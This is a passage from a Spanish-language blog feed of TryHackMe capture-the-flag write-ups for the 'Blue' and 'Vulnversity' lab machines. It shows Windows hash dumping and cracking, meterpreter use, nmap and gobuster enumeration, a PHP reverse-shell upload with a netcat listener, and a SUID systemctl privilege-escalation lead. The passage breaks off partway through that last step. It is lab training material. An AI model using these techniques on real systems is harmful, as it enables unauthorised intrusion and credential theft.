&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Dumping password hints...

Jon:&lt;span class=&quot;s2&quot;&gt;&quot;Nah boi, I ain't sharing nutting with you&quot;&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ahora vamos a intentar crackear cada contraseña con el diccionario &lt;em&gt;rockyou.txt&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john /home/blanco/Desktop/thm/blue/content/users.txt &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/blanco/Desktop/thm/rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NT

alqfna22	&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ahora a buscar la flag, para ello debemos regresar a la raiz del sistema y leer la primer bandera&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd
&lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows
meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..
meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd
&lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Listing: C:&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;============&lt;/span&gt;

Mode              Size   Type  Last modified              Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;              &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;              &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
40777/rwxrwxrwx   0      &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:18:56 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$Recycle&lt;/span&gt;.Bin
40777/rwxrwxrwx   0      &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-14 00:08:56 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Documents and Settings
40777/rwxrwxrwx   0      &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  PerfLogs
40555/r-xr-xr-x   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Program Files
40555/r-xr-xr-x   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
40777/rwxrwxrwx   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  ProgramData
40777/rwxrwxrwx   0      &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2018-12-12 22:13:22 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Recovery
40777/rwxrwxrwx   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2018-12-12 18:01:17 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  System Volume Information
40555/r-xr-xr-x   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Users
40777/rwxrwxrwx   16384  &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Windows
100666/rw-rw-rw-  24     fil   2018-12-12 22:47:39 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  flag1.txt
0000/---------    0      fif   1969-12-31 19:00:00 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  hiberfil.sys
0000/---------    0      fif   1969-12-31 19:00:00 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  pagefile.sys

meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag1.txt
xxxx&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;xxcxsx_txe_mxcxixx&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;para encontrar la 2da flag y no hacerlo manualmente usamos el comando&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;dir flag /s /p&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="Ethernal blue - ms08-067" /><category term="Windows" /><summary type="html">Implemente y piratee una máquina con Windows, aprovechando los problemas comunes de mala configuración.</summary></entry><entry><title type="html">tryhackme: vulnversity</title><link href="http://localhost:4000/vulnversity/" rel="alternate" type="text/html" title="tryhackme: vulnversity" /><published>2021-11-10T00:00:00-05:00</published><updated>2021-11-10T00:00:00-05:00</updated><id>http://localhost:4000/vulnversity</id><content type="html" xml:base="http://localhost:4000/vulnversity/">&lt;h3 id=&quot;iniciamos-la-fase-de-reconocimiento&quot;&gt;Iniciamos la fase de reconocimiento&lt;/h3&gt;

&lt;p&gt;Antes de iniciar, verificamos que la maquina este activa&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.249.39
PING 10.10.249.39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.249.39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
64 bytes from 10.10.249.39: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1085 ms

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.249.39 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1085.220/1085.220/1085.220/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Enviamos un ping y recivimos una respuesta, esta activa la maquinal&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Comprovamos que &lt;em&gt;OS&lt;/em&gt; tiene la maquia antes de iniciar&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.249.39

10.10.249.39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h3&gt;

&lt;p&gt;Iniciamos haciendo un primer escaneo con &lt;em&gt;nmap&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.249.39 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;Scan the box, how many ports are open?&lt;br /&gt;
6&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vemos que tiene 6 puertos abiertos, ahora a ver que servicios estan corriendo en cada uno&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; extractPorts allPorts
   1   │ 
   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
   3   │ 
   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.249.39
   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,22,139,445,3128,3333
   6   │ 
   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;What version of the squid proxy is running on the machine?&lt;br /&gt;
3128/tcp open  http-proxy  Squid http proxy 3.5.12&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,139,445,3128,3333 10.10.249.39 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-10 01:29 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.249.39
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 4.3.11-Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
|   Domain name: &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
|   FQDN: vulnuniversity
|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-11-10T01:30:09-05:00
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: &lt;span class=&quot;nt&quot;&gt;-1s&lt;/span&gt;
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-11-10T06:30:09
|_  start_date: N/A
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;30.84 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;(Vamos respondiendo las preguntas de la maquina)&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;How many ports will nmap scan if the flag -p-400 was used?&lt;br /&gt;
400&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Using the nmap flag -n what will it not resolve?&lt;br /&gt;
DNS&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the most likely operating system this machine is running?&lt;br /&gt;
Ubuntu&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;What port is the web server running on?&lt;br /&gt;
3333&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;locating-directories-using-gobuster&quot;&gt;Locating directories using GoBuster&lt;/h3&gt;

&lt;p&gt;En esta fase utilizaremos Gobuster para ver posibles &lt;em&gt;urls&lt;/em&gt; existentes&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the directory that has an upload form page?&lt;br /&gt;
/internal/&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.1.188:3333 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/common.txt &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster.txt

&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/11/10 09:37:40 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/.hta                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 292]
/.htpasswd            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 297]
/.htaccess            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 297]
/css                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 315] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/css/]
/fonts                &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 317] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/fonts/]
/images               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 318] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/images/]
/index.html           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 33014]                                    
/internal             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 320] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/internal/]
/js                   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 314] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.1.188:3333/js/]      
/server-status        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 301]                                        
                                                                                       
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/11/10 09:39:13 Finished
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;entramos en la ruta que encontramos con el anterior escaneo &lt;em&gt;http://10.10.1.188:3333/internal/&lt;/em&gt; y encontramos que podemos subir
un archivo en la maquina, probaremos obtener una &lt;em&gt;shell&lt;/em&gt; mediante php&lt;/p&gt;

&lt;p&gt;para ello, modificaremos &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;esta&lt;/a&gt; &lt;em&gt;shell&lt;/em&gt; de php&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnversity/server.png&quot; alt=&quot;cargar shell&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;compromise-the-webserver&quot;&gt;Compromise the webserver&lt;/h3&gt;

&lt;p&gt;En esta parte podemos hacerlo de varios metodos, pero seguiremos la maquina y utilizaremos &lt;em&gt;burp suite&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Run this attack, what extension is allowed?&lt;br /&gt;
.phtml&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnversity/shell.png&quot; alt=&quot;shell en el servidor&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ponemos nuestra maquina en escucha&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 1234
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.9.0.237] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.1.188] 57880
Linux vulnuniversity 4.4.0-142-generic &lt;span class=&quot;c&quot;&gt;#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
 09:55:03 up 39 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Estamos dentro de la maquina, ahora a buscar la flag 1&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the name of the user who manages the webserver?
bill&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
8xx7x92xbexax6xa22x63x6x00xcfxexb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the user flag?&lt;br /&gt;
8xdx99xxxfexaxadxxa6x36x1x0xcxcxxb&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;

&lt;p&gt;la maquina nos da una ayuda, utilidar el comando &lt;em&gt;find / -user root -perm -4000 -exec ls -ldb {} \;&lt;/em&gt;, sin embargo,
tambien es valido utilizar &lt;em&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null               
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;On the system, search for all SUID files. What file stands out?&lt;br /&gt;
/bin/systemctl&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con 
los siguientes comandos.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Primero, creamos el archivo para la conexion de shell inversa&lt;/li&gt;
